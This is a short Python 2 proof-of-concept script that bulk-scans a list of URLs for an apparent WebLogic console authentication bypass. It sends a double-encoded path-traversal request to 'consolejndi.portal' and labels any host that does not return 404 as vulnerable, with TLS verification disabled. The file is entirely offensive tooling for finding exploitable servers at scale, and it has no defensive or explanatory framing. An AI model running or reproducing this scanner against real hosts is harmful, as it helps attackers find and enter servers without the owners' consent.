# -*- coding: utf-8 -*-
#Author: somatra
import urllib3
import argparse
import requests,sys
requests.packages.urllib3.disable_warnings()

def PoC1(url_file):
	filelist = open(url_file,'r')
	target_list = filelist.readlines()
	all_url = target_list
	for each in target_list:
		each = each.strip()
		url = each + "/console/css/%252e%252e%252f/consolejndi.portal"
		try:
			r = requests.get(url,verify=False)
			if (r.status_code != 404):
				print each,"mailsms is vulnerable: {0}".format(url)
			else:
				print each,"safe!"
		except requests.exceptions.ConnectionError:
			print each,"not connect"
def PoC2(url):
	url = url.strip()
	url = url + "/console/css/%252e%252e%252f/consolejndi.portal"
	try:
		r = requests.get(url)
		if (r.status_code != 404):
			print url,"mailsms is vulnerable: {0}".format(url)
		else:
			print url,"safe!"
	except requests.exceptions.ConnectionError:
			print sys.argv[2],"not connect"
if __name__ == '__main__':
    try:
        if str(sys.argv[1]) == "-t":
            parser = argparse.ArgumentParser(description="weblogic-09.py -t 121.txt")
            parser.add_argument('-t','--target',metavar="",help="This is the address list (121.txt)")
            args = parser.parse_args()
            url_file = args.target
            PoC1(url_file)
        elif str(sys.argv[1]) == "-u":
		    PoC2(sys.argv[2])
    except:
        print "python poc.py -t Example.txt used poc1/python poc.py -u http://Example.com used poc2" 
